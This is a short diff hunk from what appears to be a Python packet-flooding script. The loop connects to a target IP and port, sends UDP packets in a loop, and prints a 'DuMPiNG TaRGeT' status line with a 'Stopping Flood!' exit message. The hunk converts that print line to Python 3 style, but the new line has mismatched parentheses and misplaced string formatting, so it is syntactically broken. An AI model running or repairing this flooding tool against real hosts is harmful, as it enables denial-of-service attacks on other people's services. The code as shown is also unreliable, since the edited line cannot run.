@@ -33,7 +33,7 @@ while True:
                 syn.connect((ip, port))
                 udp.sendto(bytes,(ip, port))
                 sent = sent + 1
-                print "DuMPiNG TaRGeT: %s | PoRT: %s | SiZe: %s | TiMe: %s | PaCKeT: %s"%(ip, port, size, t1m3, sent)
+                print("DuMPiNG TaRGeT: %s | PoRT: %s | SiZe: %s | TiMe: %s | PaCKeT: %s")%(ip, port, size, t1m3, sent))
 				#sys.stdout.write("\x1b]2;Total Packets Sent: %s\x07" % sent)
         except (KeyboardInterrupt):
                 print("Stopping Flood!")
